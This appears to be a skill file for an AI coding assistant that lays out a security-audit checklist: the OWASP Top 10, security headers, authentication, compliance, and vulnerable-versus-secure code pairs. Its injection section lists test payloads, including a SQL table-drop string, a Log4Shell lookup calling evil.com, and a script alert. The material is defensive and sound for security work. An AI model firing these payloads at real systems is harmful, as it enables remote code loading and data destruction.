# Security Audit Skill

## Purpose
Comprehensive security audit framework covering OWASP Top 10, authentication, authorization, data protection, and compliance standards.

## Auto-Activation Keywords
- "security audit"
- "security scan"
- "vulnerability scan"
- "owasp"
- "penetration test"
- "security review"

## OWASP Top 10 (2021)

### A01: Broken Access Control
**Test**: Unauthorized access to resources
- Try accessing admin endpoints without admin role
- Attempt horizontal privilege escalation (access other user's data)
- Test IDOR (Insecure Direct Object Reference) vulnerabilities

**Prevention**:
- Server-side access control checks on every request
- Deny by default, explicitly allow access
- Log access control failures

### A02: Cryptographic Failures
**Test**: Sensitive data exposure
- Check for plain text passwords in database
- Verify HTTPS on all pages
- Test for sensitive data in logs/error messages

**Prevention**:
- Encrypt data at rest (AES-256)
- Use TLS 1.3 for data in transit
- Hash passwords with bcrypt/argon2 (not MD5/SHA1)

### A03: Injection (SQL, NoSQL, Command)
**Test**: Injection vulnerabilities
- Input: `'; DROP TABLE users; --`
- Input: `${jndi:ldap://evil.com/a}`
- Input: `<script>alert('XSS')</script>`

**Prevention**:
- Use parameterized queries/prepared statements
- Input validation with whitelist approach
- Escape special characters

### A04: Insecure Design
**Test**: Design flaws
- Unlimited password reset attempts
- No account lockout after failed logins
- Missing rate limiting on sensitive operations

**Prevention**:
- Threat modeling during design phase
- Secure design patterns and principles
- Rate limiting and circuit breakers

### A05: Security Misconfiguration
**Test**: Misconfigured security
- Default credentials still enabled
- Directory listing enabled
- Verbose error messages in production

**Prevention**:
- Secure defaults everywhere
- Minimal attack surface (disable unused features)
- Security headers properly configured

### A06: Vulnerable Components
**Test**: Outdated dependencies
- Check npm/pip for known CVEs
- Test for vulnerable library versions

**Prevention**:
- Regular dependency updates
- Automated vulnerability scanning (Snyk, Dependabot)
- Remove unused dependencies

### A07: Authentication Failures
**Test**: Weak authentication
- Brute force attacks possible
- Session fixation vulnerabilities
- No MFA option available

**Prevention**:
- Multi-factor authentication (MFA)
- Secure session management
- Account lockout after failed attempts

### A08: Software and Data Integrity Failures
**Test**: Integrity issues
- Unsigned software updates
- No integrity checks on serialized data
- Unvalidated CI/CD pipeline

**Prevention**:
- Digital signatures for updates
- Integrity checks for all data
- Secure CI/CD pipeline

### A09: Security Logging Failures
**Test**: Insufficient logging
- Failed login attempts not logged
- No audit trail for admin actions
- Logs missing timestamps/user context

**Prevention**:
- Log all authentication events
- Centralized log management
- Real-time alerting on suspicious activity

### A10: Server-Side Request Forgery (SSRF)
**Test**: SSRF vulnerabilities
- Can user provide URL that server fetches?
- Can internal resources be accessed?

**Prevention**:
- Whitelist allowed domains
- Disable unnecessary URL schemes (file://, gopher://)
- Network segmentation

## Security Headers Checklist

```
✅ Content-Security-Policy: default-src 'self'
✅ X-Content-Type-Options: nosniff
✅ X-Frame-Options: DENY
✅ X-XSS-Protection: 1; mode=block
✅ Strict-Transport-Security: max-age=31536000; includeSubDomains
✅ Referrer-Policy: strict-origin-when-cross-origin
✅ Permissions-Policy: geolocation=(), microphone=(), camera=()
```

## Authentication Best Practices

**Password Policy**:
- Minimum 8 characters (12+ recommended)
- Require uppercase, lowercase, number, special character
- Check against common password lists
- Password strength meter for user feedback

**Session Management**:
- HttpOnly cookies (prevent XSS access)
- Secure flag on cookies (HTTPS only)
- SameSite=Strict or Lax (CSRF protection)
- Session timeout after 30 minutes inactivity
- Invalidate sessions on logout

**Multi-Factor Authentication**:
- TOTP (Time-based One-Time Password)
- SMS backup (less secure, but better than nothing)
- Backup codes for account recovery

## Compliance Frameworks

**GDPR** (Data Protection):
- Right to be forgotten (data deletion)
- Data portability (export user data)
- Consent management
- Data breach notification (72 hours)

**PCI DSS** (Payment Card Industry):
- Never store CVV/CVC codes
- Tokenize credit card data
- Encrypt cardholder data at rest
- Quarterly vulnerability scans

**HIPAA** (Healthcare):
- Encrypt PHI (Protected Health Information)
- Access controls and audit logs
- Business Associate Agreements (BAA)
- Breach notification requirements

## Quick Audit Checklist

**Authentication** ✅:
- [ ] Password complexity enforced
- [ ] Account lockout after 5 failed attempts
- [ ] Sessions expire after inactivity
- [ ] MFA available for sensitive accounts

**Authorization** ✅:
- [ ] RBAC (Role-Based Access Control) implemented
- [ ] Server-side validation on all routes
- [ ] No client-side only security checks
- [ ] Principle of least privilege applied

**Data Protection** ✅:
- [ ] Passwords hashed with bcrypt/argon2
- [ ] Sensitive data encrypted at rest
- [ ] HTTPS enforced (no HTTP)
- [ ] No sensitive data in logs

**Input Validation** ✅:
- [ ] All user inputs validated
- [ ] Parameterized queries used (no SQL injection)
- [ ] XSS prevention (HTML escaping)
- [ ] File upload restrictions (type, size, scan)

**Error Handling** ✅:
- [ ] Generic error messages to users
- [ ] Detailed errors only in server logs
- [ ] No stack traces in production
- [ ] Proper HTTP status codes

## Common Vulnerabilities

**1. SQL Injection**
```sql
-- Vulnerable
query = "SELECT * FROM users WHERE email = '" + userInput + "'"

-- Secure
query = "SELECT * FROM users WHERE email = ?"
db.execute(query, [userInput])
```

**2. XSS (Cross-Site Scripting)**
```javascript
// Vulnerable
div.innerHTML = userInput

// Secure
div.textContent = userInput  // Or use DOMPurify
```

**3. CSRF (Cross-Site Request Forgery)**
```html
<!-- Vulnerable: No CSRF token -->
<form action="/transfer" method="POST">
  <input name="amount" value="1000">
</form>

<!-- Secure: CSRF token included -->
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="random_token">
  <input name="amount" value="1000">
</form>
```

## Security Testing Tools

**SAST** (Static Analysis):
- SonarQube
- Snyk
- GitHub CodeQL

**DAST** (Dynamic Analysis):
- OWASP ZAP
- Burp Suite
- Nikto

**Dependency Scanning**:
- npm audit
- Snyk
- Dependabot

**Container Scanning**:
- Trivy
- Clair
- Anchore

## Time Savings with MCP

Use Chrome DevTools MCP to automate security testing:
- XSS injection tests with visual verification
- CSRF token validation
- Session timeout testing
- Security header verification

**Result**: 60% faster security audits with MCP automation
